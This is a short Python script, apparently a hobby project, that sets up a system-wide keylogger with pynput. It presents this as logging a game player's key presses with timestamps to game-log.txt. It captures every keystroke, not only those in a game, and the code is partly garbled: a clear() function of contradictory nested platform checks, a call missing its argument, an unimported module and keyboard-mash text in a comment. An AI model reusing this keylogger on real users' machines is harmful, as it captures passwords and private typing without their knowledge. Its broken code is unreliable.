import time
import datetime 
from datetime import datetime 
import colorama 
from colorama import init 
import sys 
from sys import platform
import pynput
from pynput.keyboard import Key, Listener

init()

def CS(X):
    import os 
    clear()
    time.sleep(X)
    if sys.platform == 'linux':
        os.system('clear')
    if sys.platform == 'win32':
        os.system('cls')

sys.platform 

def clear():

    if sys.platform == 'win32':
        CS()
        if sys.platform == 'darwin':
            CS()
            os.system('clear')
            if sys.platform == 'win64':
                CS()
                os.system('cls')
                if sys.platform == 'linux1':
                    CS()
                    os.system('clear')
                    if sys.platform == 'linux2':
                        CS()
                        time.sleep()
                        os.system('clear')
                        if sys.platform == 'linux':
                            CS(X)
                            time.sleep(1)
                            os.system('clear')

CS(1)
clear()
A = str(input(" Player Username ===> "))

# keylogger for function base and player data in game to show datetime player pressed current key, log as well as.txt hhhhhhhhhhhhhhhhhhhhhhhhhbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

def spawn():
    time.sleep(1)
    print(" [*] log results [*] ")
    os.system(' gnome-terminal -- cat game-log.txt')

def logger():
    keys = []
    
    def pr():
        print(keys)

    def on_press(key):
        
        keys.append(key)
        write_file(keys)
        
        try:
            print('\033[34m [DATA] ====>  [KEY PRESED BY] ====>  \033[36m'f'[{A}]', ' \033[35m [AT] ===> ' + str(datetime.now()))
            #print('alphanumeric key {0} pressed by User ===> '.format(key.char))
            
        except AttributeError:
            print('\033[34m [DATA] ====> [KEY PRESSED BY]', '[BY] ====> 'f'[{A}]', '[AT] ===> ' + str(datetime.now()))
            print('special key {0} pressed'.format(key))
            
    def write_file(keys):
        
        with open('game-log.txt', 'w') as f:
            for key in keys:
                k = str(key).replace("'", "")
                f.write(k)
                f.write('\n') 
                
    def on_release(key):
        #print('{0} released'.format(key))
        if key == Key.esc:
            # Stop listener
            return False
    
    
    with Listener(on_press = on_press,
                on_release = on_release) as listener:
                        
        listener.join()



def live_time():
    while True:
        print('\033[34m [DATA] ===> \033[36m [USER] ===> ' f'{A}')
        print('\033[34m [DATA] ===> \033[36m [GAME TIME] ===> ' + str(datetime.now()))

#live_time()
logger()
